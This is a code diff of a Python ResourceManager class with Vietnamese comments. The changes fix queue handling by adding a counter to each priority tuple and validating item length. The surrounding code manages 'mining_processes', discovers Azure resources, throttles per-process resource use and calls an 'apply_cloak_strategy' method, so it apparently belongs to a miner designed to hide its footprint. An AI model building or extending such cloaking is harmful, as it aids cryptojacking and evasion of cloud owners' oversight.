@@ -437,7 +437,7 @@ class ResourceManager(BaseManager):
         self.mining_processes = []
         self.mining_processes_lock = rwlock.RWLockFair()
         self._counter = count()
-        
+
         # Azure
         self.initialize_azure_clients()
         self.discover_azure_resources()
@@ -766,7 +766,16 @@ class ResourceManager(BaseManager):
         while not self.stop_event.is_set():
             try:
                 # Lấy mục từ hàng đợi với bộ đếm
-                priority, count_val, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
+                item = self.resource_adjustment_queue.get(timeout=1)
+                
+                if len(item) != 3:
+                    self.logger.error(
+                        f"Lỗi resource_adjustment_handler: không nhận được 3 phần tử, nhận được {len(item)}: {item}"
+                    )
+                    self.resource_adjustment_queue.task_done()
+                    continue
+
+                priority, count_val, adjustment_task = item
                 task_id = hash(str(adjustment_task))
 
                 if task_id in self.processed_tasks:
@@ -788,7 +797,9 @@ class ResourceManager(BaseManager):
             except Empty:
                 pass
             except Exception as e:
-                self.logger.error(f"Lỗi resource_adjustment_handler: {e}\n{traceback.format_exc()}")
+                self.logger.error(
+                    f"Lỗi resource_adjustment_handler: {e}\n{traceback.format_exc()}"
+                )
 
     def execute_adjustment_task(self, adjustment_task):
         try:
@@ -875,20 +886,20 @@ class ResourceManager(BaseManager):
                 'function': 'adjust_cpu_threads',
                 'args': (process.pid, cpu_threads, process.name)
             }
-            self.resource_adjustment_queue.put((3, t1))
+            self.resource_adjustment_queue.put((3, next(self._counter), t1))
 
             t2 = {
                 'function': 'adjust_ram_allocation',
                 'args': (process.pid, ram_alloc, process.name)
             }
-            self.resource_adjustment_queue.put((3, t2))
+            self.resource_adjustment_queue.put((3, next(self._counter), t2))
 
             if gpu_usage_percent:
                 t3 = {
                     'function': 'adjust_gpu_usage',
                     'args': (process, gpu_usage_percent)
                 }
-                self.resource_adjustment_queue.put((3, t3))
+                self.resource_adjustment_queue.put((3, next(self._counter), t3))
             else:
                 self.logger.warning(
                     f"Chưa có GPU usage => bỏ qua GPU cho PID={process.pid}"
@@ -898,13 +909,13 @@ class ResourceManager(BaseManager):
                 'function': 'adjust_disk_io_limit',
                 'args': (process, disk_io_limit_mbps)
             }
-            self.resource_adjustment_queue.put((3, t4))
+            self.resource_adjustment_queue.put((3, next(self._counter), t4))
 
             t5 = {
                 'function': 'adjust_network_bandwidth',
                 'args': (process, net_bw_limit_mbps)
             }
-            self.resource_adjustment_queue.put((3, t5))
+            self.resource_adjustment_queue.put((3, next(self._counter), t5))
 
             self.shared_resource_manager.apply_cloak_strategy('cache', process)
 
@@ -915,7 +926,7 @@ class ResourceManager(BaseManager):
             self.logger.error(
                 f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-            
+     
     def allocate_resources_with_priority(self):
         """
         Phân bổ tài nguyên (CPU threads) theo priority.
@@ -951,7 +962,7 @@ class ResourceManager(BaseManager):
                         'function': 'adjust_cpu_threads',
                         'args': (p.pid, needed, p.name)
                     }
-                    self.resource_adjustment_queue.put((3, count_val, adjustment_task))
+                    self.resource_adjustment_queue.put((3, next(self._counter), adjustment_task))
                     allocated += needed
         except Exception as e:
             self.logger.error(
